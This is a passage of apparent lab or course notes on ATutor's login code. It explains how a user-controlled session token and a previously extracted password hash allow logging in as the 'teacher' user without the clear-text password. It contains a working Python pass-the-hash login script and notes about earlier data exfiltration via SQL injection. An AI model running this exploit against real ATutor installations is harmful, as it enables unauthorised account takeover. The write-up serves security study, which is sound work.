## Analyzing The Authentication Mechanism
Now, that we can exfiltrate data from the database, we can use our script to exfiltrate user password hashes and crack them to get clear text passwords.
However, we need to find a more convinient way to bypass the authentication mechanism to get authenticated to the web application.

We can start off buy capturing a login request from the atutor web application:

First thing that we notice is, ne of the parameters passed to the server for authentication isÂ _form_password_hidden_, which appears to hold the password hash.
This supports the assumption that there's no clear text password and only a password hash.

The values do not match, to the hashed value in the database, meaning further processing of the user-controlled data is taking place prior to authentication.
In order to understand what's going on, we can move to login.php and understand what's going on.

The file points us to login_functions.inc.php
We head to the file and start to analyze it.

One thing that catches our eye is following:

![](../../03.%20Screenshots/t1-ss30.png)

If the POST token variable is set, then then it is used to setr the SESSION token variable.
Session tokens are always an interesting item to keep track of as they are used in unexpected ways at times.

Analyzing further:

We see that if we're not using coookie based authentication, the code falls throught the _else if_ branch, where it has to variables that are user controlled i.e. $this_password and $this_login. We can cross-check this by analyizing our previously burp captured request.

Next, in the code we come closer to the main login function, we arrive at the point where the code builds the sql query.

![](../../03.%20Screenshots/t1-ss32.png)

We see that the addslashes function is in place(even though it is not working as we discussed in the previous section).
But this time, the queryDB function has been used correctly, thus an sql injection will not be possible.

Reading the code further, we see the main login query being formed as follows:
```php
} else {
	$row = queryDB("SELECT member_id, login, first_name, second_name, last_name, preferences, language, status, password AS pass, last_login FROM %smembers WHERE (login='%s' OR email='%s') AND SHA1(CONCAT(password, '%s'))='%s'", array(TABLE_PREFIX, $this_login, $this_login, $_SESSION['token'], $this_password), TRUE);
		}

//Breaking down the main parts of the code, it looks like so:

...AND SHA1(CONCAT(password, $_SESSION['token']))=$this_password;
```

We know that, we can control the session token. And also, $this_password variable is controlled by us.
The only unknown parameter, is password, which we can extract from the database from the previous vulnerability.

If this query is satisfied, then we fall to the next part of the code where the authentication happens and we're logged in:

## Exploiting The Authentication Mechanism
With a few updates in our script we now have our hands on the login hash for the teacher user.

Now, we need to calculate how the POST form_password_hidden variable is being set.
This can be easily calculated by visiting the following files:
```path
ATutor/themes/simplified_desktop/login.tmpl.php
ATutor/themes/simplified_desktop/registration.tmpl.php
```

The code that encrpyts the password is following:
```php
function encrypt_password() {
        document.form.form_password_hidden.value = hex_sha1(hex_sha1(document.form.form_password.value) + "<?php echo $_SESSION['token']; ?>");
        document.form.form_password.value = "";
        return true;

```

To recreate this we can simply create a python function that encrypts our hash with the following code:

```python
import sys, hashlib, requests

def gen_hash(passwd, token):
	m = hashlib.sha1()
	m.update(passwd + token)
	return m.hexdigest()

def we_can_login_with_a_hash():
    target = "http://%s/ATutor/login.php" % sys.argv[1]
    token = "hax"
    hashed = gen_hash(sys.argv[2], token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "teacher",
        "submit": "Login",
        "token" : token
    }
    s = requests.Session()
    r = s.post(target, data=d)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        return True
    return False

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <hash>" % sys.argv[0]
        print "(+) eg: %s 192.168.121.103 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc" % sys.argv[0]
        sys.exit(-1)
    if we_can_login_with_a_hash():
        print "(+) success!"
    else:
        print "(-) failure!"

if __name__ == "__main__":
    main()

```

Running the script we get a successful login:
